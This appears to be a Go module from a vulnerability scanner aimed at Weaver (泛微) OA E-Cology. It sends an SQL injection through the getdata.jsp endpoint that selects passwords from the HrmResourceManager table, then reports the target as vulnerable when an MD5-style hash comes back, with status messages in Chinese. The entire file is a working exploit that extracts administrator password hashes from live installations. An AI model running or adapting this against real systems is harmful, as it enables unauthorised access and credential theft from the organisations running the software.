package ecology_getdata_sqljni

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"regexp"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	vulnUrl := url + "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(vulnUrl)
	if err != nil {
		color.Red.Println("[-07] 泛微OA E-Cology getdata.jsp SQL注入漏洞不存在")
		return
	}

	body := resp.String()
	match, _ := regexp.MatchString(`[0-9A-F]{32}`, body)

	if resp.StatusCode == 200 && match {
		color.Green.Println("[+07] 泛微OA E-Cology getdata.jsp SQL注入漏洞存在 -> ", vulnUrl)
	} else {
		color.Red.Println("[-07] 泛微OA E-Cology getdata.jsp SQL注入漏洞不存在")
	}
}
